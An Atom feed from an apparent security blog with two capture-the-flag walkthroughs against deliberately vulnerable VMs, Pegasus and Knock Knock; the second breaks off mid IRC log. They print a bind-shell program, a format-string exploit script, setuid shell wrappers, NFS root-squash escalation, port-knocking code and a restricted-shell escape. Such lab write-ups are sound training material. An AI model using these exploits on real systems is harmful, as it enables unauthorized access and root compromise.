<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: vm's | FourFourFourFour]]></title>
  <link href="http://recrudesce.github.io/blog/categories/vms/atom.xml" rel="self"/>
  <link href="http://recrudesce.github.io/"/>
  <updated>2015-01-02T19:18:52+00:00</updated>
  <id>http://recrudesce.github.io/</id>
  <author>
    <name><![CDATA[recrudesce]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Because she was a princess she had a Pegasus.]]></title>
    <link href="http://recrudesce.github.io/2014/12/19/because-she-was-a-princess-she-had-a-pegasus/"/>
    <updated>2014-12-19T13:50:49+00:00</updated>
    <id>http://recrudesce.github.io/2014/12/19/because-she-was-a-princess-she-had-a-pegasus</id>
    <content type="html"><![CDATA[<p><a href="https://twitter.com/theknapsy">Knapsy</a> (<a href="https://knapsy.github.io/">blog</a>) released <a href="https://www.vulnhub.com/entry/pegasus-1,109/">Pegasus</a> - to be honest I was supposed to beta test it, but I kinda didn&rsquo;t get a chance to. However, it allowed me to experience the VM at the same time as everyone else.</p>

<p>People generally work alone on VM&rsquo;s, so to mix it up a bit, I decided to team up with <a href="https://twitter.com/barrebas">barrebas</a> (<a href="https://barrebas.github.io/">blog</a>) and own the VM as a collaboration :)</p>

<p>So, here&rsquo;s a quick walkthrough on how to root Pegasus, written by both barrebas and myself.</p>

<!-- more -->


<h1>Getting a Foot(hoof?)hold</h1>

<p><img src="http://awesomelytechie.com/wp-content/uploads/2013/08/Lets-get-down-to-business.gif" alt="" /></p>

<p>An NMAP scan shows that the VM only has a few ports open that are of interest - 22 and 8088</p>

<pre><code class="bash">root@kali:~# nmap -sS -p- -T5 172.16.231.132

Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-19 13:31 GMT
Nmap scan report for 172.16.231.132
Host is up (0.000063s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
111/tcp   open  rpcbind
8088/tcp  open  radan-http

MAC Address: 00:0C:29:E3:2A:04 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 14.74 seconds
root@kali:~#
</code></pre>

<p>8088, when visited with a browser, shows a lovely picture of a Pegasus. A quick look at the source doesn&rsquo;t reveal anything, and there&rsquo;s nothing hidden in the image file.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_001.png" alt="pegasus_001" /></a></p>

<p>Time to brute force some directories/files. Experience has shown me that vulnerable VM creators are sneaky gits, so I opted to use a large dictionary here, just to see what it came up with. Because of this large dictionary, I had to use dirbuster instead of dirb, because dirb takes ages to parse large dictionary files. Prepare for some horrible UI screenshots&hellip;</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_002.png" alt="pegasus_002" /></a></p>

<p>I&rsquo;m only interested in the files that returned HTTP 200, as these actually exist, so submit.php and codereview.php</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_003.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_003.png" alt="pegasus_003" /></a></p>

<p>codereview.php POSTS to submit.php, so for the moment I can ignore submit.php and focus on codereview.php</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_004.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_004.png" alt="pegasus_004" /></a></p>

<p><img src="http://i527.photobucket.com/albums/cc352/gabzylovescrack/HTTYD/Shudder.gif" alt="" /></p>

<p>Mike is a code reviewer, and a trainee&hellip; therefore is pretty inexperienced. After a bit of time throwing various languages at the application, I found out that if you provide C sourcecode, it gets compiled and executed. Nice ! Lets bash some shellcode in there - specifically a bind shell and submit it.</p>

<pre><code class="c">#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netinet/in.h&gt;

int main(void)
{
        int clientfd, sockfd;
        int dstport = 4444;
        int o = 1;
        struct sockaddr_in mysockaddr;

        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        //setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;o, sizeof(o)); //a luxury we don't have space for

        mysockaddr.sin_family = AF_INET; //2
        mysockaddr.sin_port = htons(dstport);
        mysockaddr.sin_addr.s_addr = INADDR_ANY; //0

        bind(sockfd, (struct sockaddr *) &amp;mysockaddr, sizeof(mysockaddr));

        listen(sockfd, 0);

        clientfd = accept(sockfd, NULL, NULL);

        dup2(clientfd, 0);
        dup2(clientfd, 1);
        dup2(clientfd, 2);

        execve("/bin/sh", NULL, NULL);
        return 0;
}
</code></pre>

<p>A quick NMAP scan confirms port 4444 has been opened.</p>

<pre><code class="bash">root@kali:~# nmap -sS -p4444 -T5 172.16.231.132

Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-19 13:47 GMT
Nmap scan report for 172.16.231.132
Host is up (0.00040s latency).
PORT     STATE SERVICE
4444/tcp open  krb524
MAC Address: 00:0C:29:E3:2A:04 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.04 seconds
root@kali:~#
</code></pre>

<p>A quick connection to the port via Netcat and a bit of Python allow us to get a TTY enabled shell.</p>

<pre><code class="bash">root@kali:~# nc -nv 172.16.231.132 4444
(UNKNOWN) [172.16.231.132] 4444 (?) open
python -c 'import pty;pty.spawn("/bin/bash")'
mike@pegasus:/home/mike$ id
id
uid=1001(mike) gid=1001(mike) groups=1001(mike)
mike@pegasus:/home/mike$
</code></pre>

<p>Now over to barrebas for the next step ! <em>fancy screen wipe animation</em></p>

<hr />

<p>So as user &ldquo;mike&rdquo;, I started poking around in the setuid binary &ldquo;my_first&rdquo;. It seemed to be some sort of C program with several functions:</p>

<pre><code class="bash">mike@pegasus:~$ ./my_first
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit
</code></pre>

<p>The mail in /var/mail/mike mentions a git repo with the source code. We started attacking the binary without looking at the code, because the vulnerability jumped up quickly. The third option was not implemented and the reverse string operation seemed to be secure. I then went for the calculator, entering:</p>

<pre><code class="bash">Selection: 1

Enter first number: 5
Enter second number: AAAA
Error details: AAAA
</code></pre>

<p>That seemed promising. I entered:</p>

<pre><code class="bash">Selection: 1

Enter first number: 5
Enter second number: %x
Error details: bff1039c
</code></pre>

<p>And we have our format string vulnerability! The basic idea now was to abuse it and overwrite a got pointer. I chose printf as the target and I wanted to overwrite it with the address of system. ASLR was enabled on pegasus, but because it is a 32 bit box, we can easily &ldquo;fix&rdquo; this with <code>ulimit -s unlimited</code>. This enlarges the stack and fixes the address of libc:</p>

<pre><code class="bash">mike@pegasus:~$ ulimit -s unlimited
mike@pegasus:~$ ldd my_first
    linux-gate.so.1 =&gt;  (0x40022000)
    libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x4002a000)
    /lib/ld-linux.so.2 (0x40000000)
</code></pre>

<p>Finding the address of system within gdb was trivial. The got pointer address can be found using objdump:</p>

<pre><code class="bash">080483b0 &lt;printf@plt&gt;:
 80483b0:   ff 25 fc 9b 04 08       jmp    *0x8049bfc
 80483b6:   68 00 00 00 00          push   $0x0
 80483bb:   e9 e0 ff ff ff          jmp    80483a0 &lt;_init+0x2c&gt;
</code></pre>

<p>So it&rsquo;s at 0x8049bfc. Now we needed to find the start of the format string on the stack. Recrudesce quickly identified it as argument number 8:</p>

<pre><code class="bash">Selection: 1

Enter first number: 5
Enter second number: AAAA%8$x
Error details: AAAA41414141
</code></pre>

<p>So I got working on an exploit. I quickly came up with this python script:</p>

<pre><code class="python">#!/usr/bin/python
import struct

def p(x):
  return struct.pack("&lt;L", x)

payload = ""

# start calculator thingie
payload += "1\n5\n"

# overwrite first part of got pointer
payload += p(0x8049bfe)
payload += "%16386c%8$hn"

# overwrite second part of got pointer
payload += p(0x8049bfc)
payload += "%20566c%12$hn"

payload += "\n"

# exit program
payload += "4\n"
print payload
</code></pre>

<p>The format string first writes some dummy bytes and then overwrites the first part of the got pointer. It takes the 8th argument off the stack and uses %hn to write a half-nibble to that address. The value is the number of bytes that have been written.</p>

<p>Then, it takes the 12th argument, which is the pointer to the second half of the got entry. It writes some dummy bytes and then the outputs the number of bytes written to the got address. Effectively, after running the exploit, the memory location at 0x8049bfc now contains 0x40069060. This is the address of system in libc after running the ulimit trick.</p>

<p>So if we run this exploit, the next time printf() will be called by the binary, it will call system() instead!</p>

<pre><code class="bash">mike@pegasus:~$ python exploit.py | ./my_first

...snip...

sh: 1: Selection:: not found

Goodbye!
</code></pre>

<p>OK, we have system() being called! So to fully exploit it and grant us a shell, we make a symlink to /bin/dash and call it &ldquo;Selection:&rdquo;. Finally we need to set the PATH environment variable so that the shell searches in the current directory and finds our symlink. The exploit is pushed to the binary via stdin and the cat command then catches the shell that is being spawned (otherwise it closes immediately).</p>

<pre><code class="bash">mike@pegasus:~$ ln -s /bin/dash Selection:
mike@pegasus:~$ export PATH=".:$PATH"
mike@pegasus:~$ ulimit -s unlimited
mike@pegasus:~$ (python ./exploit.py; cat) | ./my_first 

...snip...

id
uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike)
</code></pre>

<p>So we now have a shell as john! I wanted to spawn another shell (using python) to get a pty, but it wouldn&rsquo;t let me:</p>

<pre><code class="bash">python -c 'import pty;pty.spawn("/bin/bash")'
Traceback (most recent call last):
  File "&lt;string&gt;", line 1, in &lt;module&gt;
  File "/usr/lib/python2.7/pty.py", line 165, in spawn
    pid, master_fd = fork()
  File "/usr/lib/python2.7/pty.py", line 107, in fork
    master_fd, slave_fd = openpty()
  File "/usr/lib/python2.7/pty.py", line 29, in openpty
    master_fd, slave_name = _open_terminal()
  File "/usr/lib/python2.7/pty.py", line 70, in _open_terminal
    raise os.error, 'out of pty devices'
OSError: out of pty devices
</code></pre>

<p>This is probably because our little trainee &ldquo;mike&rdquo; is not a real person and is using up all our pty&rsquo;s! No problem, we thought, let&rsquo;s upload our ssh keys&hellip; only that failed, because our gid is set to mike and not john. Hmmm.. I wrote a small C wrapper to try and set gid and uid to 1000 (john) but it wouldn&rsquo;t let me set gid.</p>

<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main(int argc, char *argv[]){
setreuid(geteuid(), geteuid());
setregid(geteuid(), geteuid());

execv("/bin/dash", argv);
return 0;
}
</code></pre>

<p>But this did have the nice side-effect of allowing us a to spawn a pty shell!</p>

<pre><code class="bash">/tmp/a.out
id
uid=1000(john) gid=1001(mike) groups=1000(john),1001(mike)
python -c 'import pty;pty.spawn("/bin/bash")'
john@pegasus:~$ sudo -l
sudo -l
Matching Defaults entries for john on this host:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on this host:
    (root) NOPASSWD: /usr/local/sbin/nfs
</code></pre>

<p>Nice! Now we can see that john is allowed to start the nfs daemon&hellip; Interesting, because /etc/exports lists the following entry:</p>

<pre><code class="bash">/opt/nfs    *(rw,sync,crossmnt,no_subtree_check,no_root_squash
</code></pre>

<p>no_root_squash&hellip; we can mount it remotely and have our own uid! NFS will not set it to nobody:nobody&hellip;</p>

<p>Over to recrudesce for the last bit of pwning pegasus!</p>

<hr />

<p>Before I continue, lets hear it for barrebas and his exploit dev skills.</p>

<p><img src="http://www.thepoke.co.uk/wp-content/uploads/2013/11/applause-3.gif" alt="" /></p>

<p>So, NFS huh ? What can I do with that ? <em>thinks</em>&hellip; well, I can mount it remotely and drop a file as root on my Kali box, suid the binary and execute it on Pegasus as john.</p>

<pre><code class="bash">root@kali:~# mount -t nfs 172.16.231.132:/opt/nfs /mnt/nfs
root@kali:~# cd /mnt/nfs
root@kali:/mnt/nfs# ls -la
total 8
drwxr-xr-x 2 root root 4096 Nov 18 03:43 .
drwxr-xr-x 4 root root 4096 Dec 19 13:09 ..
</code></pre>

<p>OK, so a quick side note here - my Kali box is 64 bit&hellip; if it were 32 bit I could just copy /bin/sh to /mnt/nfs and suid it. So, in this case, I have to use a C wrapper to execute a shell instead.</p>

<p>The code for the C wrapper is pretty straight forward</p>

<pre><code class="c">int main(void)
{
        system("/bin/dash");
}
</code></pre>

<p>This is then compiled as a 32 bit binary, dropped into /mnt/nfs on my Kali box, and chmodded to 4777</p>

<pre><code class="bash">root@kali:/mnt/nfs# gcc wrapper.c -m32
root@kali:/mnt/nfs# chmod 4777 a.out
</code></pre>

<p>Which, when executed as user john, drops me to a root shell</p>

<pre><code class="bash">john@pegasus:/opt/nfs$ ls -la
ls -la
total 32
drwxr-xr-x 2 root root 4096 Dec 20 00:17 .
drwxr-xr-x 5 root root 4096 Nov 18 20:51 ..
-rwsrwxrwx 1 root root 7160 Dec 20 00:17 a.out
john@pegasus:/opt/nfs$ ./moo2
./a.out
# id
uid=1000(john) gid=1001(mike) euid=0(root) groups=0(root),1001(mike)
</code></pre>

<p>Allowing the grail of grails&hellip; the ability to cat /root/flag</p>

<pre><code class="bash"># cat flag
               ,
               |`\
              /'_/_
            ,'_/\_/\_                       ,
          ,'_/\'_\_,/_                    ,'|
        ,'_/\_'_ \_ \_/                _,-'_/
      ,'_/'\_'_ \_ \'_,\           _,-'_,-/ \,      Pegasus is one of the best
    ,' /_\ _'_ \_ \'_,/       __,-'&lt;_,' _,\_,/      known creatures in Greek
   ( (' )\/(_ \_ \'_,\   __--' _,-_/_,-',_/ _\      mythology. He is a winged
    \_`\&gt; 6` 7  \'_,/ ,-' _,-,'\,_'_ \,_/'_,\       stallion usually depicted
     \/-  _/ 7 '/ _,' _/'\_  \,_'_ \_ \'_,/         as pure white in color.
      \_'/&gt;   7'_/' _/' \_ '\,_'_ \_ \'_,\          Symbol of wisdom and fame.
        &gt;/  _ ,V  ,&lt;  \__ '\,_'_ \_ \'_,/
      /'_  ( )_)\/-,',__ '\,_'_,\_,\'_\             Fun fact: Pegasus was also
     ( ) \_ \|_  `\_    \_,/'\,_'_,/'               a video game system sold in
      \\_  \_\_)    `\_                             Poland, Serbia and Bosnia.
       \_)   &gt;        `\_                           It was a hardware clone of
            /  `,      |`\_                         the Nintendo Famicom.
           /    \     / \ `\
          /   __/|   /  /  `\
         (`  (   (` (_  \   /
         /  ,/    |  /  /   \
        / ,/      | /   \   `\_
      _/_/        |/    /__/,_/
     /_(         /_( 

CONGRATULATIONS! You made it :)

Hope you enjoyed the challenge as much as I enjoyed creating it and I hope you
learnt a thing or two while doing it! :)

Massive thanks and a big shoutout to @iMulitia for beta-breaking my VM and
providing first review.

Feel free to hit me up on Twitter @TheKnapsy or at #vulnhub channel on freenode
and leave some feedback, I would love to hear from you!

Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com for
more awesome boot2root VMs!
</code></pre>

<p><img src="http://media.tumblr.com/tumblr_m7bmngSpkh1rs4olx.gif" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Knock Knock... Who's There ?]]></title>
    <link href="http://recrudesce.github.io/2014/10/26/knock-knock-whos-there/"/>
    <updated>2014-10-26T18:42:03+00:00</updated>
    <id>http://recrudesce.github.io/2014/10/26/knock-knock-whos-there</id>
    <content type="html"><![CDATA[<p><a href="https://twitter.com/zer0w1re">zer0w1re</a> released his first VM, <a href="http://vulnhub.com/entry/knock-knock-11,105/">Knock Knock</a>, so I downloaded it and had a go (truth be told, I tested it before the public release, but this writeup is for the version available on Vulnhub.)</p>

<!-- more -->


<p><img src="http://www.quickmeme.com/img/24/24feb14fa531ddb2c9fbe31c1607f6b71e1dd30c6b5820790e8110da7f8f8d3e.jpg" alt="" /></p>

<pre><code class="bash">root@pwk:~# nmap -sS -T5 -p- -O --script banner 172.16.56.139

Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-23 18:55 BST
Nmap scan report for 172.16.56.139
Host is up (0.00044s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE
1337/tcp open  waste
|_banner: [57154, 48662, 9528]
MAC Address: 00:0C:29:DE:8D:33 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 3.2, Linux 3.2 - 3.10
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.00 seconds
root@pwk:~# 
</code></pre>

<p>Connecting to port 1337 results in 3 numbers.</p>

<pre><code class="bash">root@pwk:~# nc 172.16.56.139 1337
[56861, 38987, 45887]
root@pwk:~# 
</code></pre>

<p>I guess I&rsquo;m knocking some ports then.
NB: in the test version, these 3 ports were in order, in the release version they&rsquo;re randomised. So rather than knocking them in the order returned, we&rsquo;re going to have to write a python script to do all possible port orders. The fun thing here is we don&rsquo;t need to check anything after each knock attempt - we just knock the port numbers in all possible combinations and then check afterwards for any new ports.</p>

<p>I couldn&rsquo;t be bothered to write my own script, so I stole <a href="https://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/">Leonjza&rsquo;s</a>, as I was talking to him about it at the time</p>

<pre><code class="python">
#!/usr/bin/python

import socket
import itertools
import sys

destination = "192.168.56.203"

def clean_up_ports(raw_string):
    """ Clean up the raw string received on the socket"""
    if len(raw_string) &lt;= 0:
        return None

    # Remove the first [
    raw_string = raw_string.replace('[','')
    # Remove the second ]
    raw_string = raw_string.replace(']','')
    # split by commas
    first_list = raw_string.split(',')

    # start e empty return list
    ports = []
    for port in first_list:
        # strip the whitespace around the string
        # and cast to a integer
        ports.append(int(port.strip()))

    return  ports

def main():
    print "[+] Getting sequence"

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((destination, 1337))
    except Exception as e:
        print "[+] Unable to connect to %s on port 1337. %s" % (destination, e)
        sys.exit(1)

    # receive the list
    raw_list = sock.recv(20)

    # get the ports in a actual python list
    ports = clean_up_ports(raw_list)

    print "[+] Sequence is %s" % ports
    print "[+] Knocking on the door using all the possible combinations...\n"

    # Lets knock all of the possible combinations of the ports list
    for port_list in itertools.permutations(ports):

        print "[+] Knocking with sequence: %s" % (port_list,)
        for port in port_list:
            print "[+] Knocking on port %s:%s" % (destination,port)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect_ex((destination, port))
            sock.close()

        print "[+] Finished sequence knock\n"

if __name__ == '__main__':
    print "[+] Knock knock opener"
    main()
    print "[+] Done"
</code></pre>

<p>He&rsquo;s a clever one :P</p>

<pre><code class="bash">root@pwk:~# python knock.py
[+] Knock knock opener
[+] Getting sequence
[+] Sequence is [37430, 5311, 17504]
[+] Knocking on the door using all the possible combinations...

[+] Knocking with sequence: (37430, 5311, 17504)
[+] Knocking on port 172.16.56.139:37430
[+] Knocking on port 172.16.56.139:5311
[+] Knocking on port 172.16.56.139:17504
[+] Finished sequence knock

[+] Knocking with sequence: (37430, 17504, 5311)
[+] Knocking on port 172.16.56.139:37430
[+] Knocking on port 172.16.56.139:17504
[+] Knocking on port 172.16.56.139:5311
[+] Finished sequence knock

[+] Knocking with sequence: (5311, 37430, 17504)
[+] Knocking on port 172.16.56.139:5311
[+] Knocking on port 172.16.56.139:37430
[+] Knocking on port 172.16.56.139:17504
[+] Finished sequence knock

[+] Knocking with sequence: (5311, 17504, 37430)
[+] Knocking on port 172.16.56.139:5311
[+] Knocking on port 172.16.56.139:17504
[+] Knocking on port 172.16.56.139:37430
[+] Finished sequence knock

[+] Knocking with sequence: (17504, 37430, 5311)
[+] Knocking on port 172.16.56.139:17504
[+] Knocking on port 172.16.56.139:37430
[+] Knocking on port 172.16.56.139:5311
[+] Finished sequence knock

[+] Knocking with sequence: (17504, 5311, 37430)
[+] Knocking on port 172.16.56.139:17504
[+] Knocking on port 172.16.56.139:5311
[+] Knocking on port 172.16.56.139:37430
[+] Finished sequence knock

[+] Done
root@pwk:~#
</code></pre>

<p>Now another NMAP is required to see what opened (if anything)</p>

<pre><code class="bash">root@pwk:~/# nmap -sS -T5 --script banner 172.16.56.139

Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-23 19:14 BST
Nmap scan report for 172.16.56.139
Host is up (0.00025s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
|_banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
80/tcp open  http
MAC Address: 00:0C:29:DE:8D:33 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 25.87 seconds
root@pwk:~/#
</code></pre>

<p>The HTTP server is hosting a simple page, which displays an image of a door, and text asking us to look deeper.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/10/knockknock_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/10/knockknock_001.png" alt="knockknock_001" /></a></p>

<p>Now, if that&rsquo;s not an invitation to look inside the JPG, then I don&rsquo;t know what is.</p>

<pre><code class="bash">root@pwk:~# wget http://172.16.56.139/knockknock.jpg
--2014-10-23 19:17:39--  http://172.16.56.139/knockknock.jpg
Connecting to 172.16.56.139:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 84741 (83K) [image/jpeg]
Saving to: `knockknock.jpg'

100%[======================================================================================================================================================================================================&gt;] 84,741      --.-K/s   in 0s      

2014-10-23 19:17:39 (612 MB/s) - `knockknock.jpg' saved [84741/84741]

root@pwk:~# strings knockknock.jpg
JFIF
Ducky
http://ns.adobe.com/xap/1.0/
************************************ SNIP ! ************************************
qW|U
\+\U
Login Credentials
abfnW
sax2Cw9Ow
root@pwk:~#
</code></pre>

<p>Ooh, some possible credentials. They look like ROT13, so&hellip;</p>

<pre><code class="bash">root@pwk:~# python rot13.py abfnW
nosaJ
root@pwk:~#
</code></pre>

<p>OK, that&rsquo;s just Jason reversed, so I guess the same deal for the password.</p>

<pre><code class="bash">root@pwk:~# python rot13.py sax2Cw9Ow | rev
jB9jP2knf
root@pwk:~#
</code></pre>

<p>These credentials can be used to SSH into the VM, which allows us to take a quick look around.</p>

<pre><code class="bash">root@pwk:~# ssh jason@172.16.56.139
jason@172.16.56.139's password: jB9jP2knf
Linux knockknock 3.2.0-4-486 #1 Debian 3.2.60-1+deb7u3 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Mon Oct  6 12:33:37 2014 from 192.168.56.202
jason@knockknock:~$ ls -l
total 8
-rwsr-xr-x 1 root jason 7457 Oct 11 18:35 tfc
jason@knockknock:~$
</code></pre>

<p>Looks like we&rsquo;re in a restricted bash shell, so lets escape that quickly</p>

<pre><code class="bash">jason@knockknock:~$ ./tfc
-rbash: ./tfc: restricted: cannot specify `/' in command names
jason@knockknock:~$ ftp
ftp&gt; !
jason@knockknock:~$ ./tfc
_______________________________
\__    ___/\_   _____/\_   ___ \
  |    |    |    __)  /    \  \/
  |    |    |     \   \     \____
  |____|    \___  /    \______  /
                \/            \/ 

    Tiny File Crypter - 1.0

Usage: ./tfc &lt;filein.tfc&gt; &lt;fileout.tfc&gt;
jason@knockknock:~$ 
</code></pre>

<p>OK, so the next part is probably explained a lot better by reading some IRC logs.</p>

<pre><code class="text">[2014-10-10T21:51:11+0100] &lt;recrudesce&gt; hey
[2014-10-10T21:51:18+0100] &lt;recrudesce&gt; so, xcrypt
[2014-10-10T21:51:36+0100] &lt;c0ne&gt; hey
[2014-10-10T21:52:09+0100] &lt;recrudesce&gt; i see that the encryption changes based on the length
[2014-10-10T21:52:28+0100] &lt;recrudesce&gt; so i figure you can send it an ascii string that actually creates a binary
[2014-10-10T21:52:33+0100] &lt;recrudesce&gt; but it wont be suid, so not possible to run it
[2014-10-10T21:53:23+0100] &lt;c0ne&gt; as in use tfc to make a file?
[2014-10-10T21:53:50+0100] &lt;recrudesce&gt; yeah
[2014-10-10T21:54:01+0100] &lt;recrudesce&gt; cos you can work out what ascii chars will relate to the correct hex values
[2014-10-10T21:54:04+0100] &lt;recrudesce&gt; was just a thought
[2014-10-10T21:54:18+0100] &lt;c0ne&gt; hmm it was not intended
[2014-10-10T21:54:36+0100] &lt;recrudesce&gt; so if i needed a binary that was 3161 3161
[2014-10-10T21:54:42+0100] &lt;recrudesce&gt; i can just encrypt a1a1
[2014-10-10T21:54:52+0100] &lt;recrudesce&gt; and it'll create me a output with hex 3161 3161
[2014-10-10T21:54:58+0100] &lt;recrudesce&gt; just chmod +x it and run it
[2014-10-10T21:55:07+0100] &lt;recrudesce&gt; i guess i could work out what chars would result in the required hex.
[2014-10-10T21:55:12+0100] &lt;recrudesce&gt; then encrypt that to generate the binary
[2014-10-10T21:55:24+0100] &lt;c0ne&gt; could i push you allite bit ahead?
[2014-10-10T21:55:30+0100] &lt;c0ne&gt; into some other road..
[2014-10-10T21:55:35+0100] &lt;recrudesce&gt; but what's the point, cos i am only able to run that as jason
[2014-10-10T21:55:42+0100] &lt;recrudesce&gt; so, it's something to do with xcrypt
[2014-10-10T21:55:55+0100] &lt;recrudesce&gt; need to send something to xcrypt to make it create, or execute something
[2014-10-10T21:55:57+0100] &lt;c0ne&gt; its a kinda classic vuln...
[2014-10-10T21:56:11+0100] &lt;recrudesce&gt; so either buffer overflow or formatstr
[2014-10-10T21:56:16+0100] &lt;recrudesce&gt; please dont let it be formatstr
[2014-10-10T21:56:19+0100] &lt;c0ne&gt; first one
[2014-10-10T21:56:22+0100] &lt;c0ne&gt; simple bof
[2014-10-10T21:56:27+0100] &lt;c0ne&gt; but...
[2014-10-10T21:56:55+0100] &lt;c0ne&gt; you need to figure out this xcrypt in order to be able to encrypt your payload
[2014-10-10T21:57:47+0100] &lt;c0ne&gt; also regarding
[2014-10-10T21:57:48+0100] &lt;c0ne&gt; [22:52] &lt;recrudesce&gt; i see that the encryption changes based on the length
[2014-10-10T21:57:55+0100] &lt;c0ne&gt; yes and no...
[2014-10-10T21:58:12+0100] &lt;c0ne&gt; the key will change depending on the length
[2014-10-10T22:03:01+0100] &lt;c0ne&gt; basically it's a four byte key created from some init values and changes every time after crypting 4 bytes
[2014-10-10T22:03:56+0100] &lt;recrudesce&gt; i can make it  segfault by passing it 1000 a's
[2014-10-10T22:04:00+0100] &lt;recrudesce&gt; but only on the box
[2014-10-10T22:04:02+0100] &lt;recrudesce&gt; not on my kali
[2014-10-10T22:05:57+0100] &lt;c0ne&gt; 1000 a's kinda suprisses me
[2014-10-10T22:06:09+0100] &lt;c0ne&gt; since the buffer is bigger
[2014-10-10T22:06:21+0100] &lt;recrudesce&gt; i seg faulted it on 1000 a's
[2014-10-10T22:06:45+0100] &lt;c0ne&gt; k
[2014-10-10T22:06:51+0100] &lt;c0ne&gt; try something like 5000
[2014-10-10T22:08:26+0100] &lt;recrudesce&gt; ok, i made it crash
[2014-10-10T22:08:43+0100] &lt;recrudesce&gt; 725cce63
[2014-10-10T22:08:48+0100] &lt;recrudesce&gt; but it's not in the pattern cos it's encrypting it
[2014-10-10T22:08:56+0100] &lt;c0ne&gt; exactly
[2014-10-10T22:11:35+0100] &lt;recrudesce&gt; you're evil
[2014-10-10T22:11:45+0100] &lt;c0ne&gt; motherless child
[2014-10-10T22:12:15+0100] &lt;recrudesce&gt; is the original key based off a static init value
[2014-10-10T22:12:17+0100] &lt;recrudesce&gt; or a dynamic one
[2014-10-10T22:12:24+0100] &lt;c0ne&gt; static
[2014-10-10T22:12:26+0100] &lt;c0ne&gt; also
[2014-10-10T22:12:31+0100] &lt;recrudesce&gt; so the first key is always the same
[2014-10-10T22:12:33+0100] &lt;c0ne&gt; xcrypt is one way
[2014-10-10T22:12:49+0100] &lt;c0ne&gt; so it either encrypts or decrypts
[2014-10-10T22:14:10+0100] &lt;c0ne&gt; basicly what is does it
[2014-10-10T22:14:53+0100] &lt;c0ne&gt; creates a 4byte key(dword) crypts a block of 4 bytes(dword) and then changes the key based on another static value
[2014-10-10T22:15:18+0100] &lt;c0ne&gt; and its keeps changing for every loop round
[2014-10-10T22:15:47+0100] &lt;recrudesce&gt; so essentially the key is the same on first loop
[2014-10-10T22:15:52+0100] &lt;recrudesce&gt; and same on 2nd loop ?
[2014-10-10T22:15:56+0100] &lt;c0ne&gt; also on the next
[2014-10-10T22:16:00+0100] &lt;c0ne&gt; and so on...
[2014-10-10T22:16:06+0100] &lt;recrudesce&gt; so no matter what i send it length wise, the 1st key is ALWAYS the same
[2014-10-10T22:16:09+0100] &lt;recrudesce&gt; and so is the 2nd key
[2014-10-10T22:16:12+0100] &lt;c0ne&gt; its a simple math mutation
[2014-10-10T22:16:21+0100] &lt;recrudesce&gt; gotta work out how you generate the 2nd key
[2014-10-10T22:16:27+0100] &lt;recrudesce&gt; work out what the first key is too
[2014-10-10T22:16:41+0100] &lt;c0ne&gt; there is only one key
[2014-10-10T22:16:41+0100] &lt;recrudesce&gt; then you can work out what the algorithm is to generate the keys
[2014-10-10T22:16:47+0100] &lt;recrudesce&gt; yeah, but you mutate it
[2014-10-10T22:16:53+0100] &lt;c0ne&gt; thats exactly what you need to do
[2014-10-10T22:17:16+0100] &lt;c0ne&gt; see how the key is build and mutates
[2014-10-10T22:18:28+0100] &lt;recrudesce&gt; v3 is the key
[2014-10-10T22:18:35+0100] &lt;recrudesce&gt; in pseudo-c
[2014-10-10T22:18:49+0100] &lt;recrudesce&gt; v3 = -367349345
